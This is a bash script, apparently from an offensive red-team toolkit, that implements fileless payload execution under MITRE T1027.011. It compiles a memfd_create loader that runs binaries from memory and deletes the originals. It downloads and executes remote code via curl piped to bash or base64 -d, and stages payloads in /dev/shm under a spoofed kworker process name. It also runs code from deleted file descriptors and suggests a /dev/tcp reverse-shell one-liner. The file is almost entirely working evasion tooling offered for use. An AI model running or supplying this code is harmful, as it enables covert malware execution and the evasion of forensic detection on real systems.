#!/bin/bash
# T1027.011 — Obfuscated Files: Fileless Storage / Memfd Execution
# Execute payloads from memory with zero disk artifacts

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_memfd"

banner_memfd() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1027.011 — Fileless / Memfd Execution      ║"
    echo "  ║   Run payloads from memory — zero disk trace   ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

memfd_c_exec() {
    echo -e "${CYAN}[*] Memfd Execution via C helper (memfd_create + fexecve)${NC}"

    # Build the memfd loader if not present
    local LOADER="/tmp/.d3m0n_memfd_loader"

    if [[ ! -x "$LOADER" ]]; then
        if ! command -v gcc &>/dev/null; then
            echo -e "${RED}[!] gcc required for memfd_create helper${NC}"
            return
        fi

        cat > "/tmp/_memfd.c" << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <fcntl.h>

/* memfd_create wrapper for older glibc */
#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

static int my_memfd_create(const char *name, unsigned int flags) {
    return syscall(SYS_memfd_create, name, flags);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <elf_binary> [args...]\n", argv[0]);
        fprintf(stderr, "  Reads ELF from file, executes from memory fd\n");
        fprintf(stderr, "  Or pipe: cat binary | %s - [args...]\n", argv[0]);
        return 1;
    }

    FILE *fp;
    if (strcmp(argv[1], "-") == 0) {
        fp = stdin;
    } else {
        fp = fopen(argv[1], "rb");
        if (!fp) { perror("fopen"); return 1; }
    }

    /* Create anonymous memory file */
    int fd = my_memfd_create("", MFD_CLOEXEC);
    if (fd < 0) { perror("memfd_create"); return 1; }

    /* Read binary into memfd */
    char buf[65536];
    ssize_t n;
    while ((n = fread(buf, 1, sizeof(buf), fp)) > 0) {
        if (write(fd, buf, n) != n) { perror("write"); return 1; }
    }
    if (fp != stdin) fclose(fp);

    /* Delete source file if it exists (fileless) */
    if (strcmp(argv[1], "-") != 0) {
        unlink(argv[1]);
    }

    /* Execute from memory fd */
    char fdpath[64];
    snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", fd);

    /* Shift argv for the new program */
    char **new_argv = &argv[1];
    new_argv[0] = fdpath;

    execv(fdpath, new_argv);
    perror("execv");
    return 1;
}
CEOF

        gcc -o "$LOADER" /tmp/_memfd.c -static 2>/dev/null || gcc -o "$LOADER" /tmp/_memfd.c 2>/dev/null
        rm -f /tmp/_memfd.c

        if [[ ! -x "$LOADER" ]]; then
            echo -e "${RED}[!] Compilation failed${NC}"
            return
        fi
        echo -e "${GREEN}[+] Memfd loader compiled: ${LOADER}${NC}"
    fi

    echo -e "  ${CYAN}[1]${NC} Execute local ELF from memory"
    echo -e "  ${CYAN}[2]${NC} Download & execute from memory (curl → memfd)"
    echo -e "  ${CYAN}[3]${NC} Pipe from stdin"
    read -p "  Method [1]: " method
    method="${method:-1}"

    case "$method" in
        1)
            read -p "  Path to ELF binary: " ELFPATH
            [[ ! -f "$ELFPATH" ]] && { echo -e "${RED}[!] File not found${NC}"; return; }
            read -p "  Arguments (optional): " ARGS
            echo -e "${YELLOW}[*] Executing from memory (original will be deleted)...${NC}"
            "$LOADER" "$ELFPATH" $ARGS
            ;;
        2)
            read -p "  URL to ELF binary: " URL
            read -p "  Arguments (optional): " ARGS
            echo -e "${YELLOW}[*] Downloading to memory and executing...${NC}"
            curl -sL "$URL" | "$LOADER" - $ARGS
            ;;
        3)
            read -p "  Arguments (optional): " ARGS
            echo -e "${YELLOW}[*] Pipe ELF binary to stdin...${NC}"
            "$LOADER" - $ARGS
            ;;
    esac
}

devshm_exec() {
    echo -e "${CYAN}[*] /dev/shm staging with auto-unlink${NC}"

    read -p "  Path to payload (or URL): " SRC
    read -p "  Process name to masquerade as [kworker/0:1]: " PNAME
    PNAME="${PNAME:-kworker/0:1}"

    local TMPNAME=".$(head -c 8 /dev/urandom | xxd -p)"
    local SHMPATH="/dev/shm/${TMPNAME}"

    if [[ "$SRC" == http* ]]; then
        curl -sL "$SRC" -o "$SHMPATH" 2>/dev/null || wget -q "$SRC" -O "$SHMPATH" 2>/dev/null
    else
        cp "$SRC" "$SHMPATH" 2>/dev/null
    fi

    [[ ! -f "$SHMPATH" ]] && { echo -e "${RED}[!] Failed to stage payload${NC}"; return; }

    chmod 755 "$SHMPATH" 2>/dev/null

    # Execute with process name spoofing and auto-delete
    (
        exec -a "$PNAME" "$SHMPATH" &
        local PID=$!
        # Delete immediately after exec
        rm -f "$SHMPATH"
        echo -e "${GREEN}[+] Executing as '${PNAME}' (PID: ${PID}), payload deleted from /dev/shm${NC}"
    )
}

procfd_exec() {
    echo -e "${CYAN}[*] /proc/self/fd execution trick${NC}"

    read -p "  Script/payload content (one-liner): " PAYLOAD

    # Create fd pointing to a deleted file containing our payload
    local TMPF
    TMPF=$(mktemp)
    echo "#!/bin/bash" > "$TMPF"
    echo "$PAYLOAD" >> "$TMPF"
    chmod 755 "$TMPF"

    # Open fd, delete file, execute from fd
    exec 3< "$TMPF"
    rm -f "$TMPF"

    # The file is gone from disk but still accessible via fd 3
    bash /proc/self/fd/3
    exec 3<&-

    echo -e "${GREEN}[+] Executed from /proc/self/fd (no disk artifact)${NC}"
}

heredoc_exec() {
    echo -e "${CYAN}[*] Heredoc-to-exec pipe (shell payload)${NC}"

    read -p "  Shell payload (e.g., 'bash -i >& /dev/tcp/IP/PORT 0>&1'): " PAYLOAD
    read -p "  Execute in background? [y/N]: " BG

    echo -e "${YELLOW}[*] Executing via heredoc pipe...${NC}"

    if [[ "$BG" =~ ^[Yy] ]]; then
        bash -c "$PAYLOAD" &
        disown
        echo -e "${GREEN}[+] Running in background (PID: $!)${NC}"
    else
        bash -c "$PAYLOAD"
    fi

    echo -e "${GREEN}[+] No file written to disk${NC}"
}

curl_exec() {
    echo -e "${CYAN}[*] Download-and-execute from memory (curl | bash)${NC}"

    read -p "  URL to shell script: " URL
    read -p "  Interpreter [bash]: " INTERP
    INTERP="${INTERP:-bash}"

    echo -e "  ${CYAN}[1]${NC} Direct pipe (curl | bash)"
    echo -e "  ${CYAN}[2]${NC} Process substitution (bash <(curl))"
    echo -e "  ${CYAN}[3]${NC} Base64 decode pipe"
    read -p "  Method [1]: " method
    method="${method:-1}"

    case "$method" in
        1)
            echo -e "${YELLOW}[*] curl -sL ${URL} | ${INTERP}${NC}"
            curl -sL "$URL" | "$INTERP"
            ;;
        2)
            echo -e "${YELLOW}[*] ${INTERP} <(curl -sL ${URL})${NC}"
            "$INTERP" <(curl -sL "$URL")
            ;;
        3)
            echo -e "${YELLOW}[*] curl → base64 -d → ${INTERP}${NC}"
            curl -sL "$URL" | base64 -d | "$INTERP"
            ;;
    esac

    echo -e "${GREEN}[+] Executed with zero disk footprint${NC}"
}

main() {
    banner_memfd

    echo -e "  ${CYAN}[1]${NC} memfd_create + fexecve (C helper — ELF from memory)"
    echo -e "  ${CYAN}[2]${NC} /dev/shm staging with auto-delete"
    echo -e "  ${CYAN}[3]${NC} /proc/self/fd execution (deleted file descriptor)"
    echo -e "  ${CYAN}[4]${NC} Heredoc-to-exec pipe (shell payloads)"
    echo -e "  ${CYAN}[5]${NC} Download-and-execute from memory"
    echo ""
    read -p "Choose [1-5]: " OPT

    case "$OPT" in
        1) memfd_c_exec ;;
        2) devshm_exec ;;
        3) procfd_exec ;;
        4) heredoc_exec ;;
        5) curl_exec ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
